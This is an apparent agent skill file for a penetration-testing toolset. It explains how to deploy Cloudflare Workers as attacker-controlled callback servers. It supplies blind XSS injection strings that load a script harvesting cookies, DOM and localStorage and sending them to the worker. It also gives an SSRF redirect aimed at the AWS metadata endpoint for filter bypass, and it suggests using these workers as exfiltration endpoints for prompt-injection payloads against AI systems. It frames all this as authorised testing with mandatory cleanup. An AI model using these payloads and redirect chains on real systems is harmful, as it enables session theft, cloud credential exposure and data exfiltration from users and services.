---
name: wrangler-oast
description: "Deploy Cloudflare Workers as custom OAST endpoints for blind XSS payload hosting, configurable callback receivers, and SSRF redirect servers. Use when you need attacker-controlled infrastructure beyond what interactsh/webhook.site provides — custom response bodies, JS payload serving, or 302 redirect chains. Requires CLOUDFLARE_API_TOKEN and CLOUDFLARE_ACCOUNT_ID (CF_API_TOKEN / CF_ACCOUNT_ID aliases accepted). Triggers on 'blind XSS', 'custom callback server', 'OAST worker', 'serve a payload', 'redirect server', 'wrangler'."
---

# Wrangler OAST — Cloudflare Workers for Out-of-Band Testing

Deploy Cloudflare Workers as custom OAST (Out-of-Band Application Security Testing) endpoints. This complements interactsh and webhook.site by giving you **programmable** callback infrastructure at the edge.

**Activation gate:** Only use this skill when `CLOUDFLARE_API_TOKEN` and `CLOUDFLARE_ACCOUNT_ID` are set in the environment (the `CF_API_TOKEN` / `CF_ACCOUNT_ID` aliases also work). If unset, do not suggest wrangler — fall back to `get_callback_url` (webhook.site / interactsh), which needs no credentials. Do not ask the user to enable it; state the requirement once if a technique genuinely needs a custom endpoint and move on.

## When to Use This vs. Interactsh

| Need | Tool |
|---|---|
| Detect whether a target makes an outbound request | interactsh / `get_callback_url` |
| Serve a **custom JavaScript payload** (blind XSS) | `wrangler_deploy` with `blind-xss` template |
| Serve a **custom HTTP response** (content-type, headers, body) | `wrangler_deploy` with `custom` template |
| **302 redirect** an SSRF to a different target | `wrangler_deploy` with `redirect` template |
| Log **full request details** with custom processing | `wrangler_deploy` with `callback` template |

## Prerequisites

1. `CLOUDFLARE_API_TOKEN` — create at https://dash.cloudflare.com/profile/api-tokens with **Workers Scripts Edit** permission
2. `CLOUDFLARE_ACCOUNT_ID` — found in the Cloudflare dashboard sidebar

Call `wrangler_status` to verify both are set and the token is valid before deploying.

## Workflow

### 1. Check Auth

```
wrangler_status
```

If auth fails, the user needs to set the env vars. Do not proceed without valid auth.

### 2. Deploy a Worker

**OAST Callback** — logs every incoming request with full headers, body, and metadata:
```
wrangler_deploy(template="callback")
```

**Blind XSS Probe** — serves a JS payload at the root URL that exfiltrates page data (cookies, DOM, localStorage) back to `/collect` on the same worker:
```
wrangler_deploy(template="blind-xss")
```

Then inject the worker URL as a script source: `<script src="https://dn-oast-xxx.workers.dev"></script>`

**SSRF Redirect** — 302 redirects all requests to a target (e.g., cloud metadata):
```
wrangler_deploy(template="redirect", redirect_target="http://169.254.169.254/latest/meta-data/")
```

**Custom Worker** — deploy arbitrary JavaScript:
```
wrangler_deploy(template="custom", worker_code='export default { fetch() { return new Response("<html>custom</html>", { headers: { "Content-Type": "text/html" } }); } };')
```

### 3. Monitor Interactions

After injecting the worker URL into the target, check for incoming requests:
```
wrangler_tail(name="dn-oast-xxx", seconds=15)
```

`wrangler_tail` captures both `console.log()` output from template workers (structured JSON with method, URL, headers, body) and raw request events (method + URL) for custom workers that never call console.log.

### 4. Clean Up

**Cleanup is mandatory.** Always delete workers after testing:
```
wrangler_delete(name="dn-oast-xxx")
```

Use `wrangler_list` to find all deployed workers. Workers created by this toolset use the `dn-oast-` prefix. Log what you created in the gadget ledger, and tear it down before the engagement ends.

## Template Details

### callback
Logs every request as structured JSON. Responds with `200 OK` and `Access-Control-Allow-Origin: *` to maximize compatibility with CORS-restricted contexts.

Logged fields: `timestamp`, `method`, `url`, `path`, `headers`, `body`, `cf` (Cloudflare request metadata including geolocation).

### blind-xss
Two-endpoint worker:
- **`/`** — serves a JavaScript probe that collects `document.cookie`, `location.href`, DOM (first 8KB), `localStorage`, `origin`, and `referrer`, then POSTs the data as JSON to `/collect`
- **`/collect`** — receives and logs the exfiltrated data (CORS preflight handled)

Inject as: `"><script src=https://WORKER.workers.dev></script>` or `javascript:void(document.body.appendChild(document.createElement('script')).src='https://WORKER.workers.dev')`

### redirect
Returns `302` redirecting to a configurable target URL (defaults to AWS metadata endpoint). The redirect is returned to the *client* — the worker itself never fetches the target, so internal/private addresses work when the SSRF victim follows redirects. Useful for:
- SSRF filter bypass (server allows `*.workers.dev` but blocks internal IPs)
- Protocol downgrade (HTTPS worker redirects to HTTP internal target)
- Chained exploitation (redirect to internal service URLs)

The `redirect_target` must be a full URL including scheme (`http://` or `https://`).

## Combining with Other Tools

- **With interactsh**: Deploy a worker for payload hosting, use interactsh for reliable OOB detection. Best of both worlds.
- **With CallbackClient**: If you only need detection (not custom responses), `get_callback_url` is simpler and requires no Cloudflare credentials.
- **With blind SSRF chains**: Deploy a redirect worker to chain SSRF through Workers edge → internal target. See the `blind-ssrf-chains` skill.
- **With data exfiltration**: Deploy a callback worker as the exfil endpoint for prompt injection or XSS payloads.

## Important Notes

- Workers deploy to Cloudflare's global edge network. Latency is consistently low.
- Free Cloudflare plans allow 100,000 requests/day — more than enough for testing.
- Workers get a `*.workers.dev` subdomain automatically. No custom domain needed.
- `wrangler_tail` connects to the real-time log stream for a bounded window (max 60s per call). Call it repeatedly for longer monitoring.
- Nothing is persisted locally; auth is read from the environment on every call. The tool never runs `wrangler login`.
- Always clean up deployed workers after testing. Use `wrangler_list` + `wrangler_delete`.
